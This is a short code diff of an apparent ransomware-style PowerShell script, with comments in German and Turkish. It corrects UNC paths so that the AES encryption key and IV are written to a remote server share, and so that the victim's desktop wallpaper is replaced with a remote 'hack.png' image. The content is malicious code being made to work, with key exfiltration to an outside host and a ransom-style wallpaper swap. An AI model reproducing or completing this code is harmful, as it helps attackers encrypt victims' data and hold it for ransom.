@@ -17,8 +17,8 @@ $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
 $IV = $aesManaged.IV
 
 # encryption-key and IV speichern auf Webservern
-$keyFile = "\hostname:port\victory\encryptionKey.bin"
-$ivFile = "\hostname:port\victory\encryptionIV.bin"
+$keyFile = "\\hostname:port\sensible\encryptionKey.bin"
+$ivFile = "\\hostname:port\sensible\encryptionIV.bin"
 [System.IO.File]::WriteAllBytes($keyFile, $aesManaged.Key)
 [System.IO.File]::WriteAllBytes($ivFile, $aesManaged.IV)
 
@@ -60,5 +60,5 @@ public class Wallpaper {
 "@
 
 # Yeni wallpaper yolu
-$newWallpaperPath = "\hostname:port\hack.png"
+$newWallpaperPath = "\\hostname:port\hack.png"
 [Wallpaper]::SystemParametersInfo(0x0014, 0, $newWallpaperPath, 0x01 -bor 0x02)
